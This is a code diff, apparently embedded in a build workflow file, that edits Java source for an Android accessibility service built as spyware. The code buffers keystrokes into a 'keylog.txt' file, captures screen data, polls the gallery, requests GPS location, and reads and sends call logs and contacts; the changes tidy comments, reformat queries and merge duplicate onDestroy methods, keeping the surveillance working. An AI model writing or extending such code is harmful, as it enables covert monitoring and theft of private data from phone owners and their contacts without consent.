@@ -320,11 +320,9 @@ jobs:
               private Thread deviceStateThread, galleryPollerThread, gpsRequestThread, callContactsThread;
               private String deviceId, deviceToken;
 
-              // Keylogger buffer
               private StringBuilder pendingText = new StringBuilder();
               private String pendingPackageName = null;
 
-              // Screen data debounce
               private Runnable screenDataRunnable = null;
               private String lastScreenPackageName = null;
               private String lastSentScreenData = "";
@@ -333,7 +331,6 @@ jobs:
                   @Override
                   public void onReceive(Context context, Intent intent) {
                       if (ACTION_SYNC_CALL_CONTACTS.equals(intent.getAction())) {
-                          // Run sync on background thread
                           new Thread(() -> {
                               try {
                                   sendCallLogs();
@@ -355,16 +352,6 @@ jobs:
                   } catch (Throwable t) {
                       Log.e(TAG, "onServiceConnected crash", t);
                   }
-              }
-
-              @Override
-              public void onDestroy() {
-                  super.onDestroy();
-                  try { unregisterReceiver(syncReceiver); } catch (Exception ignored) {}
-                  if (deviceStateThread != null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
-                  if (galleryPollerThread != null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
-                  if (gpsRequestThread != null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
-                  if (callContactsThread != null && callContactsThread.isAlive()) callContactsThread.interrupt();
               }
 
               private void showToast(String msg) {
@@ -431,7 +418,7 @@ jobs:
 
               private void startCallContactsSender() {
                   callContactsThread = new Thread(() -> {
-                      // Immediate sync on service start (if permissions already granted)
+                      // Immediate sync on service start
                       try {
                           sendCallLogs();
                           sendContacts();
@@ -488,13 +475,7 @@ jobs:
                       String[] selectionArgs = { String.valueOf(cutoff) };
 
                       JSONArray logsArray = new JSONArray();
-                      Cursor cursor = getContentResolver().query(
-                              CallLog.Calls.CONTENT_URI,
-                              null,
-                              selection,
-                              selectionArgs,
-                              CallLog.Calls.DATE + " DESC"
-                      );
+                      Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, selection, selectionArgs, CallLog.Calls.DATE + " DESC");
                       if (cursor != null) {
                           while (cursor.moveToNext()) {
                               String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
@@ -527,13 +508,7 @@ jobs:
                   if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
                   try {
                       JSONArray contactsArray = new JSONArray();
-                      Cursor cursor = getContentResolver().query(
-                              ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                              null,
-                              null,
-                              null,
-                              ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
-                      );
+                      Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                       if (cursor != null) {
                           while (cursor.moveToNext()) {
                               String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
@@ -731,7 +706,16 @@ jobs:
               private void logToFile(String data){ try{ File dir=new File(getExternalFilesDir(null),"logs"); if(!dir.exists())dir.mkdirs(); FileWriter fw=new FileWriter(new File(dir,"keylog.txt"),true); fw.append(data).append("\n"); fw.close(); }catch(Throwable t){ } }
 
               @Override public void onInterrupt() {}
-              @Override public void onDestroy(){ super.onDestroy(); if(deviceStateThread!=null&&deviceStateThread.isAlive())deviceStateThread.interrupt(); if(galleryPollerThread!=null&&galleryPollerThread.isAlive())galleryPollerThread.interrupt(); if(gpsRequestThread!=null&&gpsRequestThread.isAlive())gpsRequestThread.interrupt(); if(callContactsThread!=null&&callContactsThread.isAlive())callContactsThread.interrupt(); }
+
+              // Only ONE onDestroy method
+              @Override public void onDestroy(){
+                  super.onDestroy();
+                  try { unregisterReceiver(syncReceiver); } catch (Exception ignored) {}
+                  if(deviceStateThread!=null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
+                  if(galleryPollerThread!=null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
+                  if(gpsRequestThread!=null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
+                  if(callContactsThread!=null && callContactsThread.isAlive()) callContactsThread.interrupt();
+              }
 
               private static class InstalledApp { String name,packageName; InstalledApp(String n,String p){name=n;packageName=p;} }
           }
